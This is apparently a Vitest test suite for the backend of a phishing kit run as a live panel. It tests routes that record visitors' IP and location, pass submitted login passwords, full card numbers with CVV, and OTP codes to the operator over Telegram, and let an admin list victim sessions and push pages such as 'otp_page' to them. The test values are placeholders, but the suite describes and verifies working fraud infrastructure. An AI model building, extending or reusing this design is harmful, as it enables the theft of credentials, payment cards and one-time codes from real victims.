import { describe, expect, it, vi, beforeEach } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

// Mock the database module
vi.mock("./db", () => ({
  getDb: vi.fn().mockResolvedValue(null),
}));

// Mock fetch for Telegram
global.fetch = vi.fn().mockResolvedValue({ ok: true, json: async () => ({}) });

function createPublicContext(): TrpcContext {
  return {
    user: null,
    req: {
      protocol: "https",
      headers: { "x-forwarded-for": "1.2.3.4" },
    } as TrpcContext["req"],
    res: {
      clearCookie: vi.fn(),
    } as TrpcContext["res"],
  };
}

function createAdminContext(): TrpcContext {
  return {
    user: {
      id: 1,
      openId: "admin-user",
      email: "admin@example.com",
      name: "Admin User",
      loginMethod: "manus",
      role: "admin",
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    },
    req: {
      protocol: "https",
      headers: {},
    } as TrpcContext["req"],
    res: {
      clearCookie: vi.fn(),
    } as TrpcContext["res"],
  };
}

describe("session.init", () => {
  it("returns a sessionId when db is unavailable", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.session.init({
      ip: "1.2.3.4",
      country: "US",
      city: "New York",
      zip: "10001",
      countryCode: "US",
    });
    expect(result).toHaveProperty("sessionId");
    expect(typeof result.sessionId).toBe("string");
    expect(result.sessionId.length).toBeGreaterThan(0);
  });
});

describe("session.heartbeat", () => {
  it("returns ok when db is unavailable", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.session.heartbeat({ sessionId: "test-session" });
    expect(result).toEqual({ ok: true });
  });
});

describe("session.poll", () => {
  it("returns default command when db is unavailable", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.session.poll({ sessionId: "test-session" });
    expect(result).toHaveProperty("command");
    expect(result.command).toBe("none");
  });
});

describe("notify.captchaPassed", () => {
  it("sends telegram notification and returns ok", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.notify.captchaPassed({
      sessionId: "test-session",
      ip: "1.2.3.4",
      country: "Algeria",
      city: "Algiers",
      zip: "16000",
      countryCode: "DZ",
    });
    expect(result).toEqual({ ok: true });
    expect(global.fetch).toHaveBeenCalled();
  });
});

describe("notify.loginSubmitted", () => {
  it("sends telegram notification and returns ok", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.notify.loginSubmitted({
      sessionId: "test-session",
      email: "user@example.com",
      password: "secret123",
    });
    expect(result).toEqual({ ok: true });
  });
});

describe("notify.paymentSubmitted", () => {
  it("sends telegram notification and returns ok", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.notify.paymentSubmitted({
      sessionId: "test-session",
      cardNumber: "4111 1111 1111 1111",
      cardExpiry: "12/26",
      cardCvv: "123",
      cardName: "John Doe",
      cardType: "Visa",
    });
    expect(result).toEqual({ ok: true });
  });
});

describe("notify.otpSubmitted", () => {
  it("sends telegram notification and returns ok", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.notify.otpSubmitted({
      sessionId: "test-session",
      otp: "123456",
    });
    expect(result).toEqual({ ok: true });
  });
});

describe("admin.listSessions", () => {
  it("returns empty array when db is unavailable", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.admin.listSessions();
    expect(Array.isArray(result)).toBe(true);
  });

  it("throws when user is not admin", async () => {
    const ctx = createPublicContext();
    ctx.user = {
      id: 2,
      openId: "regular-user",
      email: "user@example.com",
      name: "Regular User",
      loginMethod: "manus",
      role: "user",
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    };
    const caller = appRouter.createCaller(ctx);
    await expect(caller.admin.listSessions()).rejects.toThrow("Forbidden");
  });
});

describe("admin.sendCommand", () => {
  it("returns ok:false when db is unavailable", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.admin.sendCommand({
      sessionId: "test-session",
      command: "otp_page",
    });
    expect(result).toEqual({ ok: false });
  });
});

describe("auth.logout", () => {
  it("clears session cookie and returns success", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.auth.logout();
    expect(result).toEqual({ success: true });
    expect(ctx.res.clearCookie).toHaveBeenCalled();
  });
});
